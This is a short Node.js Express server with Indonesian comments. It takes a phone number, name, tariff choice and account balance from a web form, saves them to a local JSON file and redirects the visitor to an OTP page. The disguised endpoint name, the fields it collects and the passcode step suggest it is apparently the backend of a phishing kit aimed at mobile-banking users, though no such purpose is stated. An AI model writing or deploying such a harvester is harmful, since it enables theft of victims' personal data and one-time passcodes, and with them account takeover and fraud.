const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

// Inisialisasi Express
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Pastikan folder data ada
if (!fs.existsSync('data')) {
    fs.mkdirSync('data');
}

// Endpoint untuk menerima data form
app.post('/rest/no.js', (req, res) => {
    console.log('Menerima data:', req.body);
    
    try {
        const { tarif, nohp, nama, saldo } = req.body;
        
        // Validasi data
        if (!tarif || !nohp || !nama || !saldo) {
            return res.status(400).json({ 
                success: false, 
                message: 'Semua field harus diisi' 
            });
        }
        
        // Format data
        const formData = {
            id: Date.now(),
            tarif,
            nohp: nohp.replace(/\D/g, ''),
            nama: nama.trim(),
            saldo: saldo.replace(/\D/g, ''),
            timestamp: new Date().toLocaleString('id-ID')
        };
        
        // Simpan data ke file
        const filePath = path.join(__dirname, 'data', 'submissions.json');
        let existingData = [];
        
        if (fs.existsSync(filePath)) {
            const fileContent = fs.readFileSync(filePath, 'utf8');
            existingData = JSON.parse(fileContent);
        }
        
        existingData.push(formData);
        fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));
        
        console.log('Data berhasil disimpan:', formData);
        
        // Kirim respons JSON yang benar
        res.json({ 
            success: true, 
            message: 'Data berhasil diproses',
            redirect: '/otp.html'
        });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Terjadi kesalahan server' 
        });
    }
});

// Endpoint untuk halaman utama
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Endpoint untuk halaman OTP
app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

// Jalankan server
app.listen(PORT, () => {
    console.log(`Server berjalan di http://localhost:${PORT}`);
});
